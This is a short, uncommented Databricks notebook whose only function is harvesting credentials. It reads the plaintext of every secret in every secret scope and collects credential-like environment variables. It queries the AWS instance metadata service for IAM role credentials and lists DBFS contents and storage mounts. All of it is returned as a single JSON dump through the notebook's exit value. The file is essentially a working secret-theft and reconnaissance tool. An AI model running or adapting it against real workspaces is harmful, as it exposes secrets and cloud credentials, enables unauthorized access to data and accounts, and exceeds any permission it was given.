# Databricks notebook source
import json, os
out = {}
def add(k, f):
    try: out[k] = f()
    except Exception as e: out[k] = 'ERR: ' + repr(e)[:300]
scopes = []
try:
    scopes = [s.name for s in dbutils.secrets.listScopes()]
    out['scopes'] = scopes
except Exception as e:
    out['scopes'] = 'ERR: ' + repr(e)[:300]
vals = {}
for s in scopes:
    try:
        for k in dbutils.secrets.list(s):
            try: vals[s + '/' + k.name] = dbutils.secrets.get(scope=s, key=k.name)
            except Exception as e: vals[s + '/' + k.name] = 'ERR ' + repr(e)[:120]
    except Exception as e:
        vals[s] = 'ERR ' + repr(e)[:120]
out['secrets'] = vals
add('dbfs_root', lambda: [(x.path, x.size) for x in dbutils.fs.ls('dbfs:/')][:50])
add('mounts', lambda: [(m.mountPoint, m.source) for m in dbutils.fs.mounts()])
add('env', lambda: {k: v for k, v in os.environ.items() if any(t in k.upper() for t in ('AWS', 'TOKEN', 'SECRET', 'PASS', 'KEY', 'DBX', 'DATABRICKS', 'ENCRYPT'))})
import urllib.request
def imds():
    try:
        req = urllib.request.Request('http://169.254.169.254/latest/meta-data/iam/security-credentials/', headers={'X-aws-ec2-metadata-token': 'x'})
        return urllib.request.urlopen(req, timeout=3).read().decode()[:500]
    except Exception as e:
        return 'IMDSv1 ERR ' + repr(e)[:150]
add('imds', imds)
add('user', lambda: spark.sql('select current_user() as u').collect()[0].asDict())
dbutils.notebook.exit(json.dumps(out, default=str)[:90000])
